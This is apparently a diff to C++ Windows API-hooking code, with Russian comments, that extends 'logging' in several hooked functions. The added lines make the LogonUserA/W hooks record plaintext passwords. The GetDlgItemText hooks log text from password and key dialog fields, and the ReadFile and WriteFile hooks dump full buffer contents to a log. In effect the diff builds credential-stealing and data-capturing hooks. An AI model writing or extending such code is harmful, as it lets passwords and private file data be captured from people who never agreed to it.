@@ -9,6 +9,7 @@
 #include <sstream>
 #include <mutex>
 #include <vector>
+#include <iomanip>
 #include <wincred.h>
 #include <wincrypt.h>
 #define SECURITY_WIN32
@@ -31,6 +32,7 @@ std::mutex& GetLogMutex() {
 }
 
 inline std::string ws2s(const std::wstring& wstr) {
+    if (wstr.empty()) return {};
     int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
     std::string strTo(size_needed, 0);
     WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &strTo[0], size_needed, nullptr, nullptr);
@@ -47,6 +49,15 @@ inline void WriteLog(const std::string& msg) {
 
 inline void WriteLogW(const std::wstring& msg) {
     WriteLog(ws2s(msg));
+}
+
+inline std::string bin2hex(const unsigned char* data, size_t size) {
+    std::ostringstream oss;
+    oss << std::hex << std::setfill('0');
+    for (size_t i = 0; i < size; ++i) {
+        oss << std::setw(2) << (int)data[i];
+    }
+    return oss.str();
 }
 
 // --- COMMON SIGNATURES ---
@@ -140,7 +151,7 @@ pRevertSecurityContext fpRevertSecurityContext = NULL;
 pAuthzInitializeResourceManager fpAuthzInitializeResourceManager = NULL;
 pAuthzAccessCheck    fpAuthzAccessCheck = NULL;
 
-// --- HOOKED FUNCTIONS (логирование в файл) ---
+// --- HOOKED FUNCTIONS (расширенное логирование) ---
 
 // Интернет/HTTP
 HINTERNET WINAPI Hooked_InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders,
@@ -189,15 +200,17 @@ int __cdecl Hooked_Memcmp(const void* s1, const void* s2, size_t len) {
     return fpMemcmp(s1, s2, len);
 }
 
-// UI
+// UI Ввод/отображение паролей и ключей
 UINT WINAPI Hooked_GetDlgItemTextA(HWND hDlg, int nIDDlgItem, LPSTR lpString, int nMaxCount) {
     UINT result = fpGetDlgItemTextA(hDlg, nIDDlgItem, lpString, nMaxCount);
-    WriteLog("[HOOK] GetDlgItemTextA: " + std::string(lpString));
+    WriteLog("[HOOK] GetDlgItemTextA (ID: " + std::to_string(nIDDlgItem) + "): " +
+        (lpString ? std::string(lpString) : "<NULL>"));
     return result;
 }
 UINT WINAPI Hooked_GetDlgItemTextW(HWND hDlg, int nIDDlgItem, LPWSTR lpString, int nMaxCount) {
     UINT result = fpGetDlgItemTextW(hDlg, nIDDlgItem, lpString, nMaxCount);
-    WriteLogW(L"[HOOK] GetDlgItemTextW: " + std::wstring(lpString));
+    WriteLog("[HOOK] GetDlgItemTextW (ID: " + std::to_string(nIDDlgItem) + "): " +
+        ws2s(lpString ? lpString : L"<NULL>"));
     return result;
 }
 BOOL WINAPI Hooked_SetWindowTextA(HWND hWnd, LPCSTR lpString) {
@@ -209,27 +222,43 @@ BOOL WINAPI Hooked_SetWindowTextW(HWND hWnd, LPCWSTR lpString) {
     return fpSetWindowTextW(hWnd, lpString);
 }
 
-// Файлы
+// Файлы (добавлена возможность логировать данные, если это строка; для бинарных файлов — раскомментируйте bin2hex)
 BOOL WINAPI Hooked_WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
     std::ostringstream oss;
     oss << "[HOOK] WriteFile, bytes=" << nNumberOfBytesToWrite;
+    // Для диагностики как строки (если lpBuffer похоже на текст):
+    oss << ", data=\"";
+    oss << std::string(reinterpret_cast<const char*>(lpBuffer), nNumberOfBytesToWrite);
+    oss << "\"";
+    // Для бинарника — раскомментируйте строку ниже:
+    // oss << ", hex=" << bin2hex(reinterpret_cast<const unsigned char*>(lpBuffer), nNumberOfBytesToWrite);
     WriteLog(oss.str());
     return fpWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
 }
 BOOL WINAPI Hooked_ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
+    BOOL ret = fpReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
     std::ostringstream oss;
     oss << "[HOOK] ReadFile, bytes=" << nNumberOfBytesToRead;
+    if (lpBuffer && *lpNumberOfBytesRead > 0) {
+        oss << ", data=\"";
+        oss << std::string(reinterpret_cast<const char*>(lpBuffer), *lpNumberOfBytesRead);
+        oss << "\"";
+        // Для бинарника — раскомментируйте строку ниже:
+        // oss << ", hex=" << bin2hex(reinterpret_cast<const unsigned char*>(lpBuffer), *lpNumberOfBytesRead);
+    }
     WriteLog(oss.str());
-    return fpReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
+    return ret;
 }
 
 // Крипто/WinAPI (auth/crypto/credentials)
 BOOL WINAPI Hooked_LogonUserA(LPCSTR user, LPCSTR domain, LPCSTR pass, DWORD logonType, DWORD logonProvider, PHANDLE phToken) {
-    WriteLog("[HOOK] LogonUserA: " + std::string(user ? user : "(null)"));
+    WriteLog("[HOOK] LogonUserA: user=\"" + std::string(user ? user : "(null)") + "\" pass=\"" +
+        std::string(pass ? pass : "(null)") + "\"");
     return fpLogonUserA(user, domain, pass, logonType, logonProvider, phToken);
 }
 BOOL WINAPI Hooked_LogonUserW(LPCWSTR user, LPCWSTR domain, LPCWSTR pass, DWORD logonType, DWORD logonProvider, PHANDLE phToken) {
-    WriteLogW(L"[HOOK] LogonUserW: " + std::wstring(user ? user : L"(null)"));
+    WriteLog("[HOOK] LogonUserW: user=\"" + ws2s(user ? user : L"(null)") + "\" pass=\"" +
+        ws2s(pass ? pass : L"(null)") + "\"");
     return fpLogonUserW(user, domain, pass, logonType, logonProvider, phToken);
 }
 BOOL WINAPI Hooked_CredWriteA(PCREDENTIALA cred, DWORD flags) {
